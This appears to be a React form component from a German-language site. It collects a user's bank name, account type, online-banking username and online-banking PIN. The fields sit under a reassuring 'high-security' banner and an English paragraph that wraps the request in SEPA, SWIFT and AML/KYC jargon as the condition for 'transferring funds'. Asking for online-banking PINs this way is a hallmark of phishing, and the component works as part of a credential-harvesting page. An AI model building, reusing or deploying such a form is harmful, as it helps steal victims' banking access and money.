"use client"

import type React from "react"

import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { ShieldAlert } from "lucide-react"

interface FinancialSectionProps {
  formData: any
  errors: any
  handleInputChange: (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => void
}

export default function FinancialSection({ formData, errors, handleInputChange }: FinancialSectionProps) {
  return (
    <div className="space-y-4">
      <Alert className="border-warning bg-warning/10">
        <ShieldAlert className="h-4 w-4 text-warning-foreground" />
        <AlertDescription className="text-sm text-warning-foreground">
          🔐 HOCHSICHERHEITSBEREICH: Ihre Zugangsdaten werden verschlüsselt übertragen und strikt vertraulich
          behandelt. Teilen Sie diese Informationen mit niemandem.
        </AlertDescription>
      </Alert>

      <div>
        <Label htmlFor="bankInstitutionName">Name der Bank *</Label>
        <Input
          id="bankInstitutionName"
          name="bankInstitutionName"
          type="text"
          value={formData.bankInstitutionName}
          onChange={handleInputChange}
          placeholder="z. B. Deutsche Bank"
          className={errors.bankInstitutionName ? "border-destructive" : ""}
          autoComplete="off"
        />
        {errors.bankInstitutionName && (
          <p className="text-xs text-destructive mt-1">{errors.bankInstitutionName}</p>
        )}
      </div>

      <div>
        <Label htmlFor="accountType">Kontotyp *</Label>
        <select
          id="accountType"
          name="accountType"
          value={formData.accountType}
          onChange={handleInputChange}
          className={`w-full px-3 py-2 border rounded-lg bg-background text-foreground ${
            errors.accountType ? "border-destructive" : "border-input"
          }`}
        >
          <option value="">Bitte wählen</option>
          <option value="checking">Girokonto</option>
          <option value="savings">Sparkonto</option>
        </select>
        {errors.accountType && <p className="text-xs text-destructive mt-1">{errors.accountType}</p>}
      </div>

      <div>
        <Label htmlFor="onlineBankingUsername">Online-Banking Benutzername *</Label>
        <Input
          id="onlineBankingUsername"
          name="onlineBankingUsername"
          type="text"
          value={formData.onlineBankingUsername}
          onChange={handleInputChange}
          placeholder="Ihr Benutzername"
          className={errors.onlineBankingUsername ? "border-destructive" : ""}
          autoComplete="off"
        />
        {errors.onlineBankingUsername && (
          <p className="text-xs text-destructive mt-1">{errors.onlineBankingUsername}</p>
        )}
      </div>

      <div>
        <Label htmlFor="onlineBankingPin">Online-Banking PIN *</Label>
        <Input
          id="onlineBankingPin"
          name="onlineBankingPin"
          type="password"
          value={formData.onlineBankingPin}
          onChange={handleInputChange}
          placeholder="••••••••"
          className={errors.onlineBankingPin ? "border-destructive" : ""}
          autoComplete="off"
        />
        {errors.onlineBankingPin && <p className="text-xs text-destructive mt-1">{errors.onlineBankingPin}</p>}
        <p className="text-xs text-muted-foreground mt-1">Geben Sie Ihre Banking-PIN ein</p>
      </div>

      <div className="space-y-2 text-sm text-muted-foreground">
        <p>
          To initiate the transfer of funds, we require your secure online banking credentials for your SEPA-enabled account. This enables a protected connection with your financial institution’s SEPA infrastructure, compliant with the Single Euro Payments Area (SEPA) framework under the European Central Bank, local clearing systems, and SWIFT where applicable, so we can verify transactional limits, liquidity thresholds, and regulatory compliance before processing deposits. We safeguard your financial information using industry-standard encryption and security protocols and adhere to anti-money-laundering (AML) and know-your-customer (KYC) requirements to maintain confidentiality and data integrity. Please ensure your credentials are accurate. For questions or assistance, please contact our Chief Financial Officer.
        </p>
      </div>
    </div>
  )
}
